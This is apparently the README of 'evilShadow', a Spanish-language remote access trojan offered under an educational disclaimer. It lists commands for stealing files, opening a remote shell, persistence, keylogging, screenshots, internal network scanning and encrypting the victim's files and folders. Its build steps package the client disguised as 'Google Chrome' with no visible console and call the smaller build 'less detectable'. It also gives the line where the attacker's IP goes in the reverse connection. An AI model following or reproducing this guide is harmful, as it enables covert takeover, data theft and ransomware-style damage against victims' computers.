# evilShadow

RECUERDA: Este repositorio es para el aprenzidaje y educación, no me hago respondable del mal uso que se le puede dar!


# Novedades

- Escaneo de servicios de nmap sin necesidad de que la victima tenga NMAP (En mejora).
- Escanear la red de la victima
- Escanera puertos de host dentro de la red de la victima

# Proximamente 
- Port Forwarding (tener conexion con los otros hosts)

# Functions
(N/A) -> Not Implemented yet
```
                Aviable Commands:

                    | [!>] downloadDir <path> -> Download A full dir
                    ---------------------------------------------------------
                    | [!>] download <path> -> Download A File From Target PC
                    ---------------------------------------------------------
                    | [!>] startTask       -> Monitoring & kill tasks managers
                    ---------------------------------------------------------
                    | [!>] check           -> Check For Administrator Privileges
                    ---------------------------------------------------------
                    | [!>] sysinfo         -> Get System Information
                    ---------------------------------------------------------
                    | [!>] shell           -> Enter Shell Mode 
                    ---------------------------------------------------------
                    | [!>] av              -> Try Detect Anti-Virus
                    ---------------------------------------------------------
                    | [!>] upload <path>   -> Upload local File To Target PC
                    ---------------------------------------------------------
                    | [!>] get <url>       -> Download A File To Target PC From Any Website
                    ---------------------------------------------------------
                    | [!>] persistence     -> Try to get persistence (needed root)
                    ---------------------------------------------------------
                    | [!>] lowpersistence  -> Try to get persistence (no root)
                    ---------------------------------------------------------
                    | [!>] exec <command>  -> Exec command in no shell mode
                    ---------------------------------------------------------
                    | [!>] cryptDir <dir>  -> Crypt a full folder in target
                    ---------------------------------------------------------
                    | [!>] crypt <file>    -> Crypt a file in target
                    ---------------------------------------------------------
                    | [!>] keylog_dump     -> Dump The Keystrokes From Keylogger
                    ---------------------------------------------------------
                    | [!>] screenshot      -> Take a screenshot
                    ---------------------------------------------------------
                    | [!>] scannet         -> Scan all active hosts on target
                    ---------------------------------------------------------
                    | [!>] scanhost <host> -> Scan ports on host
                    ---------------------------------------------------------
                    | [!>] hosts           -> See hosts scanned with scannet
                    ---------------------------------------------------------
                    | [!>] cryptAll        -> (N/A) Close connex and crypt full system
                    ---------------------------------------------------------
                    | [!>] destruction     -> (N/A) Eliminate all and close conect
                    --------------------------------------------------------- 
                    | [!>] q               -> Suspend the conection
                    ---------------------------------------------------------
                    | [!>] exit            -> Terminate the conection
                    ---------------------------------------------------------
```

# Detections:
![image](https://github.com/an0mal1a/evilShadow/assets/129337574/e59fc5b4-8467-4555-bc49-25ead1b5ffce)


HASH: 0dfb2addd6f7c91952fbb77a23a3369e1a27986d85847599be2a40b8582fd000


## New Enviorment:
- **¿Por que?**
    
  - Una de las razones es para no tener conflictos y no tener otras librerias al compilar.
  - Al crearnos un nuevo entono virtual, el .exe estará cargado con las libriras intaladas en ese entorno.
  - El .exe / .bin pesará de **"30MB"** a **"14MB"**
  - Menos detectable!!
    

- Windows:
   1. `python -m venv new`
   2. `.\new\Scripts\activate`

    
 - Linux:
   1. `python3 -m venv new`
   2. `source new/bin/activate`

PD: Para salir de este entorno, con el comando **"deactivate"** salimos del enterno nuevo de vuelta al del sistema


# Requirements

Automated:

- ```pip install -r requirements.txt```

Manal:

- ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller```


# Errors:

- Si tenemos errores con las librerias (module not found):
  - ```pip install prompt_toolkit  colorama psutil cryptography requests pillow pynput pyinstaller``` 


- Si tenemos el error **"pyinstaller not found"** en el **nuevo entorno**!

    - **Windows**
      - where pyinstaller
      
            D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe
            C:\Program Files\Python310\Scripts\pyinstaller.exe``
    
      - Usar ruta completa de pyinstaller (nuevo)
      
             D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe --noconsole ....
    


# Preparación:


En el script **Connection.py** en la línea *239* tenemos la línea que crea la conexión. La modificamos a la direccion ip
del atacante

-     sock.connect ( ( '127.0.0.1' ,1337) )

Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio más.


# **Compilación**

- Tenemos varias opciones: (Accedemos a la carpeta CLIENT)

  ### Automatic
    - `client>pyinstaller compilation.spec`

  ### Windows:

  - Admin Required:
  
      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`

  - **NO** Admin Required:
  
      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`

  ### Linux:
  
  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`


# Funciones (EXPLICAIÓN)

  - **Download**
    - Con el comando "Download" podemos descargarnos archivos de la máquina remota
      - `download /home/supervisor/Desktop/Passwords.txt`


  - **startTask**
    - Con este comando pones a ejecutarse la detección de adminitradores de tareas (windows/linux)
      - ```startTask```


  - **check**
    - Miramos si poseemos de privilegios de administrador
      - ``check`` 
  
  
  - **sysinfo**
    - Este comando nos devuelve informacion del sistema usando la libreria **platform** 
        - ``sysinfo``


  - **shell**
    - Entramos en modo shell
      - ``shell``


  - **av**
    - Detección de Anti-Virus (buscando entre procesos, se puede limitar segun el usuario que ejecuta el malware)
      - ``av``
  
    
  - **upload**
    - Subir un archivo local a la máquina remota (recomandable: ruta completa)
      - ``upload /home/supervisor/downloads/ncat.exe``
 
   
  - **get**
    - Descargar archivos (binarios incluidos) de una URL
      - ``get https://nmap.org/dist/ncat-7.94-1.x86_64.rpm``


  - **persistence**
    - Trata de conseguir la persistencia completa generando un servicio en linux y añadiendo en el registro de LOCAL_MACHINE en windows
      (ROOT NEEDED / ADMIN NEEDED)
      - ``persistence``


  - **lowpersistence**
    - Trata de conseguir la persistencia de usuario, en linux genera un crontab para el usuario, en windows un entrada en el registro de USER
      - ``lowpersistence``

  
  - **exec**
    - Ejecuta comandos en no SHELL mode
      - `exec whoami`


  - **cryptDir**
    - Encripta todo el contenido de una carpeta (subcarpetas/archivos) (recomedado: ruta completa)
      - ``cryptDir /home/pwned/project``

  
  - **crypt**
    - Encripta 1 archivo de la victima
      - ``crypt /home/pwned/project/index.html``


  - **keylog_dump**
    - Dumpea del cliente al servidor todo el keylog que se ha ido guardando
      - ``keylog_dump``
   
 
  - **screenshot**
    - Crea una captura de pantalla de la victima y la envia a través del socket
      - ```screenshot```


  - **scannet**
    - Ejecuta un escaneo de la red local de la victima en busca de hosts activos
      - ``scannet``
    

  - **hosts**
    - Muestra los hosts detectados por *scannet*
      - ``hosts``  
    
      
  - **scanhost**
    - Ejecuta un escaneo de puertos y servicios en el host mencionado
      - ``scanhost 192.168.1.1``


  - **q**
    - Suspend the connection
      - ``q``


  - **exit**
    - Close the conecction
